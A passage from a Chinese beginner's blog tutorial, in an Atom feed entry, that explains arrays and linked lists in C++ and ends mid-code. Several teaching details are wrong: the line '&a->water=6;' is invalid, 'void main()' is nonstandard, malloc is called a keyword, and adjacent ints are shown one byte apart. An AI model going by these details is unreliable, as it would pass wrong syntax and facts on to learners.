    <id>https://cdn.n0p3.cn/2020/05/18/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</id>
    <published>2020-05-18T13:32:08.000Z</published>
    <updated>2020-07-11T11:47:27.415Z</updated>
    
    <content type="html"><![CDATA[<p><em>最近在写学校的数据结构实验，考虑到博客文章太少，正好可以借此水几文。说不定还能帮别人缩短学习时间。</em></p><p><strong><em>本系列文章旨在用最直白的人话来讲清楚让一些编程初学者头疼的数据结构。如有错误烦请在评论区指正，感谢。</em></strong></p><p><strong>文章所用的代码示例均为c++代码。</strong></p><h1 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h1><p>我们身边充斥着纷繁复杂的数据，一个数字，一组数字，一个字，一句话，都是类型不同的数据。在我们使用强数据类型语言时，我们学会了区分和正确的使用它们。但是在解决实际的问题时，我们面对的数据通常会存在一定的关系。当我们以某种方式把这种关系表现出来时，我们就构造出了一种有结构的数据。</p><p>例如一句话中的每个字，它们需要按照正确的顺序排列才能表示正确的含义，那么一句话这样的数据就是一个有结构的数据。相反，你头发数量的多少和你数据结构考试成绩就没有结构上的关系。</p><p>接下来我们先来学习一下最简单的线性表。</p><h1 id="线性表的认识"><a href="#线性表的认识" class="headerlink" title="线性表的认识"></a>线性表的认识</h1><h2 id="百度百科"><a href="#百度百科" class="headerlink" title="百度百科"></a>百度百科</h2><p>线性表是最基本、最简单、也是最常用的一种数据结构。线性表<em>（linear list）</em>是<a href="https://baike.baidu.com/item/数据结构/1450" target="_blank" rel="noopener">数据结构</a>的一种，一个线性表是n个具有相同特性的数据元素的有限序列。</p><p>线性表中数据元素之间的关系是一对一的关系，即除了第一个和最后一个数据元素之外，其它数据元素都是首尾相接的（注意，这句话只适用大部分线性表，而不是全部。比如，循环链表逻辑层次上也是一种线性表（存储层次上属于链式存储，但是把最后一个数据元素的尾指针指向了首位结点）。</p><h2 id="理解线性表"><a href="#理解线性表" class="headerlink" title="理解线性表"></a>理解线性表</h2><p>学习计算机，从命名入手通常是非常有用的，线性表，顾名思义就是具有线性关系的表，下图的表格就是一个典型的例子。</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%80/%E6%88%AA%E5%B1%8F%202020-05-22%20%E4%B8%8B%E5%8D%8811.51.51.png" data-fancybox="group" data-caption="一个数组" class="fancybox"><img alt="一个数组" title="一个数组" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%80/%E6%88%AA%E5%B1%8F%202020-05-22%20%E4%B8%8B%E5%8D%8811.51.51.png" class="lazyload"></a></p><p>每一个数字就对应一个方格，一个方格即是一个储存空间。<strong>像这样在一对一的关系，就是线性关系，同时所有储存空间在逻辑上也彼此相邻，那么构成的数据结构就是线性表</strong>。</p><p><em>您现在可能对“在逻辑上彼此相邻”不能清晰的理解，不必担心，当读完下两个小节后您就能具体的理解它了</em></p><h2 id="顺序表"><a href="#顺序表" class="headerlink" title="顺序表"></a>顺序表</h2><p><strong>顺序表是一种特殊的线性表</strong>，【理解线性表】中的例图就是一个顺序表，不仅在逻辑上彼此相邻，它们的物理储存空间也彼此相邻。例如编号为4的储存空间的物理地址为0x400104，编号为5的储存空间的物理地址就为0x400105。</p><p>“数组”就是顺序表的典型例子</p><p><code>int Array[8]={104,311,173,104,226,2077,306,884};</code></p><p>这就是实现上一小节例图的具体代码。</p><h2 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h2><p><strong>链表是储存空间仅在逻辑上彼此相邻的数据结构</strong>，在介绍链表前我们要先认识一下结构体和指针，如果您已经熟知这部分内容可以直接跳到【链表的实现】。</p><h3 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h3><p>在c中，诸如int，float，char这样的数据类型被称为基本数据类型，只使用这些类型就足够实现任何我们想要的功能。但是我们在开发中常常会遇到需要多组数据类型不同的变量来储存数据的情况，例如，一款游戏中有多个npc（虚拟游戏角色），每个npc都有姓名，性别，等级，这样的数据，显然姓名是字符串，性别是整型或字符，等级和战斗力则为整型。那么我们为储存它们所声明的变量就会类似这样，Npc1Name，Npc2Name，Npc1Level，Npc2Level · · · 不难看出这样的变量命名有明显的分组的痕迹，变量多且混乱。</p><p>如果我们把npc当作一个数据类型呢，那么<strong>npc这个数据类型中储存的就是npc类型数据</strong>。听起来像是废话，我们把基本数据类型代入来读一下，<strong>int这个数据类型中储存的就是整数</strong>。您可能仍对这句话感到迷惑，让我们用代码来解释它。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">c++</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">npc</span>&#123;</span></span><br><span class="line">  <span class="built_in">string</span> Name;</span><br><span class="line">  <span class="keyword">char</span> Sex;</span><br><span class="line">  <span class="keyword">int</span> Level;</span><br><span class="line">&#125;;<span class="comment">//在1-5行定义了一个结构体npc，这就是我们的新数据类型</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  npc Npc1,Npc2;<span class="comment">//声明了两个npc类型的变量（实例化两个npc结构体对象）</span></span><br><span class="line">  Npc1=Npc2;<span class="comment">//npc类型的变量储存npc类型的数据</span></span><br><span class="line">  Npc1.Name=<span class="string">"Kali"</span>;<span class="comment">//使用句点运算符我们可以操作其中的一部分数据</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>所以，结构体可以让我们把多个不同数据类型的变量合成一个新的数据类型，并使原本分散的变量变得有条理。</p><h3 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h3><p><strong>指针是一种特殊的变量</strong>，其储存的数据是地址。例如int指针就可以储存某个整数变量所在的地址。让我们直接用代码来解释它的基本用法。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">c++</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> *p;<span class="comment">//*修饰符表示该语句声明的是一个指向整数变量的指针</span></span><br><span class="line"><span class="keyword">int</span> a=<span class="number">0</span>;</span><br><span class="line">p=&amp;a;<span class="comment">//&amp;取地址符可以获得一个变量的地址，然后存入p中</span></span><br><span class="line">*p=<span class="number">5</span>;<span class="comment">//此处的*是解引用运算符，可以解析一个地址找到它的储存空间</span></span><br></pre></td></tr></table></figure></div><p>作为一篇介绍数据结构的文章，我已经把c++基础内容讲的足够详细了，部分初学者一直有着指针很难的印象，但当你仅仅把它当作处理地址的工具时，它也就没有多复杂。不过这可能需要花点时间。</p><h2 id="链表的实现"><a href="#链表的实现" class="headerlink" title="链表的实现"></a>链表的实现</h2><p><strong>链表是结构体的一种特殊用法</strong>。我们知道结构体可以结合多个数据类型不同的变量，又知道指针是一种特殊的变量，所以我们自然可以定义一个包含指针变量的结构体。如果我们让其中一个对象的指针指向另一个对象的地址呢？事情就变得有趣起来了。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">c++</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">box</span>&#123;</span></span><br><span class="line">  <span class="keyword">int</span> water=<span class="number">0</span>;<span class="comment">//盒子里的水量，默认是0L</span></span><br><span class="line">  box* pipe=<span class="literal">NULL</span>;<span class="comment">//一个指向另一个盒子的指针，默认指向空（NULL）</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div><p>我们定义了一个结构体box，里面含有一个链接另一个盒子的管道（pipe）</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">c++</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  box a,b;</span><br><span class="line">  a.water=<span class="number">5</span>;<span class="comment">//向a盒子倒入5L的水</span></span><br><span class="line">  a.pipe=&amp;b;<span class="comment">//a的管道连接到b</span></span><br><span class="line">  a.pipe-&gt;water=a.water;<span class="comment">//通过a的管道把水倒进b</span></span><br><span class="line">  a.water=<span class="number">0</span>;<span class="comment">//a盒中没有水了</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>这是我们目前写过最复杂的代码了，如果您是编程的初学者，那么您可能会需要稍微花点时间去理解。您可能会在-&gt;与 . 之间产生迷惑，这两行代码比较了它们的区别：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">c++</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a.water=<span class="number">6</span>;</span><br><span class="line">&amp;a-&gt;water=<span class="number">6</span>;</span><br><span class="line"><span class="comment">//从一个结构体的对象中取成员时，“用句点运算符”</span></span><br><span class="line"><span class="comment">//从一个指向某结构体的指针中取成员时，用“指向结构体成员运算符”</span></span><br></pre></td></tr></table></figure></div><p>上面的操作我们把两个盒子连在了一起，就构成了一个链表，盒子叫做结点。<strong>a盒子中的管道连接着b盒子，这两个盒子就在逻辑上相邻，但在物理储存空间上并不一定相邻</strong>。</p><p>当我们再多建一些盒子并连接在一起时，一个长长的链表就构成了。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>我们已经介绍完了线性表中代表性的两个例子，顺序表和链表。</p><p>顺序表是一种特殊的线性表，<strong>一个顺序表中的所有储存空间不仅在逻辑上相邻同时在物理储存空间上也相邻</strong>。</p><p>链表则是仅在<strong>逻辑上彼此相邻</strong>。</p><p>如果您已经对这样的重复感到厌烦，恭喜你，现在我们可以去学习如何使用它们了。</p><h1 id="线性表的使用"><a href="#线性表的使用" class="headerlink" title="线性表的使用"></a>线性表的使用</h1><p><em>我所见的教材都会在此处开始分开讲顺序表的基本操作和链表的基本操作，它们的代码细节确实很不一样，但二者毕竟都是线性表，放在一起对比学习应该会更容易理解。</em></p><h2 id="储存数据"><a href="#储存数据" class="headerlink" title="储存数据"></a>储存数据</h2><h3 id="顺序表-1"><a href="#顺序表-1" class="headerlink" title="顺序表"></a>顺序表</h3><p>​    <code>int BigBox[5]={0,0,0,0,0};</code></p><p>一个有五小份储存空间的数组BigBox。我们用1-5来填充它。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">c++</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BigBox[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">BigBox[<span class="number">1</span>]=<span class="number">2</span>;</span><br><span class="line">BigBox[<span class="number">2</span>]=<span class="number">3</span>;</span><br><span class="line">BigBox[<span class="number">3</span>]=<span class="number">4</span>;</span><br><span class="line">BigBox[<span class="number">4</span>]=<span class="number">5</span>;</span><br></pre></td></tr></table></figure></div><p>显然这样做太繁琐，并且当数组更大时这样做就显得太蠢了。如此重复的工作我们很自然的可以想到用一个循环来解决它。为了代码尽量简洁，我选用了for；</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">c++</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)&#123;</span><br><span class="line">  BigBox[i]=i+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>这就完成了顺序表的储存。</p><h3 id="链表-1"><a href="#链表-1" class="headerlink" title="链表"></a>链表</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">c++</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">box</span>&#123;</span></span><br><span class="line">  <span class="keyword">int</span> data=<span class="number">0</span>;</span><br><span class="line">  box* next=<span class="literal">NULL</span>;</span><br><span class="line">&#125;<span class="comment">//这个结构体就是盒子的图纸，每个盒子除了储存数据外还有一个指向下一个盒子的指针。</span></span><br></pre></td></tr></table></figure></div><p>到这里我们只是定义好了“盒子”的制造图纸，让我们来做几个盒子。</p><p><code>box a,b,c,d,e;</code></p><p>盒子生产好了，但要成为链表还需要把它们连接起来。我们在main函数中连接它们。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">c++</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  a.next=&amp;b;</span><br><span class="line">  b.next=&amp;c;</span><br><span class="line">  c.next=&amp;d;</span><br><span class="line">  d.next=&amp;e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>好了，现在我们才完成了一个链表。接下来让我们把重点放在储存数据上。</p><p>我们向一个盒子中存放数据的代码类似这样：  </p><p><code>a.data=1;</code></p><p>如果我们就这样放数据到每个盒子里，就体现不出链表<strong>在逻辑上彼此相邻</strong>的特性了。                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              我们可以在第一个盒子填装完数据后再获取下一个盒子的地址，再进行填装。像这样有着明显重复的工作，我们同样可以用for来实现。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">c++</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">box *p=&amp;a;<span class="comment">//从a盒子开始，&amp;的作用是获取地址</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)&#123;</span><br><span class="line">p-&gt;data=i;<span class="comment">//把i放进p指向的地址的data里</span></span><br><span class="line">  p=p-&gt;next;<span class="comment">//把p指向的地址的next所指向的地址放进p</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>这些代码可能需要您好好去思考一下。第3行是在做赋值操作，第4行是在切换到下一个盒子。循环起来就可以完成对所有盒子的赋值。</p><h2 id="输出指定位置的数据"><a href="#输出指定位置的数据" class="headerlink" title="输出指定位置的数据"></a>输出指定位置的数据</h2><p>在我们使用线性表时常常要从指定的位置上取出数据。</p><h3 id="顺序表-2"><a href="#顺序表-2" class="headerlink" title="顺序表"></a>顺序表</h3><p>数组就肥肠简单</p><p><code>cout&lt;&lt;BigBox[2];</code></p><p>就可以输出第三个储存空间里的数据。</p><h3 id="链表-2"><a href="#链表-2" class="headerlink" title="链表"></a>链表</h3><p>链表就需要我们自己来实现这样的功能了。前一个盒子知道后一个盒子的位置，所以我们只要从头走到要取数据的位置就可以了。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">c++</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">box *p=&amp;a;<span class="comment">//从头开始</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">2</span>;i++)&#123;<span class="comment">//向后走两个盒子</span></span><br><span class="line">  p=p-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;p-&gt;data;<span class="comment">//此时p所指的就是第三个盒子的地址，就可以取出其中的数据了</span></span><br></pre></td></tr></table></figure></div><h2 id="遍历输出"><a href="#遍历输出" class="headerlink" title="遍历输出"></a>遍历输出</h2><p>有些时候我们需要输出所有数据，我们就需要遍历线性表的每一块储存空间并输出数据。</p><h3 id="顺序表-3"><a href="#顺序表-3" class="headerlink" title="顺序表"></a>顺序表</h3><p>如果您能理解前面的所有内容，这部分内容对您来说将会非常简单。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">c++</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;Array[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="链表-3"><a href="#链表-3" class="headerlink" title="链表"></a>链表</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">c++</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">box *p=&amp;a;<span class="comment">//从头开始</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)&#123;<span class="comment">//从头遍历到尾</span></span><br><span class="line">  <span class="built_in">cout</span>&lt;&lt;p-&gt;data;<span class="comment">//输出保存的数据</span></span><br><span class="line">  p=p-&gt;next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="按值查找"><a href="#按值查找" class="headerlink" title="按值查找"></a>按值查找</h2><p>按值查找就是根据储存空间储存的数据来找这块储存空间的位置。</p><h3 id="顺序表-4"><a href="#顺序表-4" class="headerlink" title="顺序表"></a>顺序表</h3><p>假设我们要找BigBox中的45</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">c++</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> BigBox[<span class="number">5</span>]=&#123;<span class="number">14</span>,<span class="number">23</span>,<span class="number">45</span>,<span class="number">24</span>,<span class="number">7</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)&#123;<span class="comment">//遍历整个数组</span></span><br><span class="line"> <span class="keyword">if</span>(BigBox[i]==<span class="number">45</span>)&#123;<span class="comment">//发现和45相等就输出i，这时的i就是45的位置</span></span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;i;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="链表-4"><a href="#链表-4" class="headerlink" title="链表"></a>链表</h3><p>假设我们要找链表中储存4的位置</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">c++</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">box *p=&amp;a;<span class="comment">//从头开始，。</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)&#123;<span class="comment">//从头遍历到尾</span></span><br><span class="line">  <span class="keyword">if</span>(p-&gt;data==<span class="number">4</span>)&#123;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;i;</span><br><span class="line">    <span class="comment">//cout&lt;&lt;p;针对链表的特殊性，还可以改为获得储存地址来适应程序</span></span><br><span class="line">  &#125;</span><br><span class="line">  p=p-&gt;next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>代码非常易读，在只是在遍历的过程中增加了一个判断而已。</p><p>　</p><h2 id="插入数据"><a href="#插入数据" class="headerlink" title="插入数据"></a>插入数据</h2><p>编写程序时，在线性表中常插入数据也是常有的需求。</p><h3 id="顺序表-5"><a href="#顺序表-5" class="headerlink" title="顺序表"></a>顺序表</h3><p>顺序表的储存位置是固定的，储存空间彼此相邻，我们可以把它看成单行的制冰盒，</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%80/5717519cNacb29746.jpg!q70.jpg" data-fancybox="group" data-caption="冰格" class="fancybox"><img alt="冰格" title="冰格" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%80/5717519cNacb29746.jpg!q70.jpg" class="lazyload"></a></p><p>（图片来自网络）</p><p>如果我们要在中间加一块蓝色的冰块，就要把所有的冰块向后移动一格。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">c++</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> BlueIce=<span class="number">6</span>;</span><br><span class="line"><span class="keyword">int</span> BigBox[<span class="number">6</span>]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">0</span>&#125;;<span class="comment">//想要顺序表能够插入，我们就必须重新定义这个顺序表，使他至少有一个空位。</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">4</span>;i&gt;<span class="number">1</span>;i--)&#123;</span><br><span class="line">BigBox[i+<span class="number">1</span>]=BigBox[i];</span><br><span class="line">&#125;<span class="comment">//当这个循环执行结束时，4，3，2号位置上的冰块都先后被向后挪动了一格。</span></span><br><span class="line"><span class="comment">//但是1号位置并没有向后移动，所以2号位就空出来了</span></span><br><span class="line">BigBox[<span class="number">2</span>]=BlueIce;</span><br></pre></td></tr></table></figure></div><p>只有代码可能不好快速理解，我们来看下图</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%80/QQ20200522-0.jpg" data-fancybox="group" data-caption="数组插入" class="fancybox"><img alt="数组插入" title="数组插入" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%80/QQ20200522-0.jpg" class="lazyload"></a></p><p>当循环结束时，虽然2号位有值，但是已经被复制到3号位，所以2号位就是我们可以放入新值的地方。</p><h3 id="链表-5"><a href="#链表-5" class="headerlink" title="链表"></a>链表</h3><p>在链表中插入数据，就是插入新节点，由于链表在物理储存空间上不相邻的，独立的，所以我们只要保证新节点插入后链表在逻辑上连续就可以了。再用人话说一遍就是，要把一个新盒子放进原来的一列盒子中，就要断开这个位置上原来两个盒子之间的连接，前一个盒子接上新盒子，新盒子再接上后一个盒子。用人话说完可能还不够清楚，来看图。</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%80/%E6%8F%92%E5%85%A5%E9%93%BE%E8%A1%A8.png" data-fancybox="group" data-caption="链表插入" class="fancybox"><img alt="链表插入" title="链表插入" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%80/%E6%8F%92%E5%85%A5%E9%93%BE%E8%A1%A8.png" class="lazyload"></a></p><p>小红要到小黄和小橙之间，小黄指向的下一个盒子就要变成小红，小红就要指向小橙。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">c++</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">box Red;</span><br><span class="line">box *p=&amp;a;<span class="comment">//从头开始（小蓝）</span></span><br><span class="line">p=p-&gt;next;<span class="comment">//小蓝到下一个，也就是小黄</span></span><br><span class="line">Red.next=p-&gt;next;<span class="comment">//原本小黄的下一个是小橙，现在把小橙的地址给小红。</span></span><br><span class="line">p-&gt;next=&amp;Red;<span class="comment">//最后，小黄的下一个变成小红</span></span><br></pre></td></tr></table></figure></div><p>现在，这是我们写过的最有逻辑的代码了。您可以对照上图一句一句阅读代码。请确保您完全理解再继续。</p><h1 id="链表的更多内容"><a href="#链表的更多内容" class="headerlink" title="链表的更多内容"></a>链表的更多内容</h1><p>从这里开始，就是链表才具有的特性。</p><h2 id="动态链表"><a href="#动态链表" class="headerlink" title="动态链表"></a>动态链表</h2><p>在前面，我们为了使描述尽量简单，使用的是静态链表。静态链表就是链表是用声明好的多个对象连接起来的链表。也就是说，之前我们连起来的盒子都是有名字的，a,b,c,d,e。我们用它们的名字就能直接访问到它们的数据。如果你现在并不认识new和delete关键字，那么你可能并不理解我在说什么。</p><p>所以，我们先来学习一下new和delete。（同样您已经熟知，就可以直接跳过。）</p><h3 id="关键字new"><a href="#关键字new" class="headerlink" title="关键字new"></a>关键字new</h3><p><strong>new关键字是c++对malloc关键字的再封装</strong>。这并不重要，我们只需要知道它的作用和用法即可。new的作用是申请一块新的储存空间，如果申请成功就会返回申请到的地址，如果内存不足申请失败就会直接抛出异常。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">c++</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="keyword">int</span>;<span class="comment">//这样就可以申请一块储存int类型数据的储存空间。</span></span><br><span class="line"><span class="comment">/*但是这块地址是程序运行过程中申请到的地址，它并没有名字</span></span><br><span class="line"><span class="comment">所以我们必须要把这块储存空间的地址保存下来才能使用</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">int</span> *p;</span><br><span class="line">p=<span 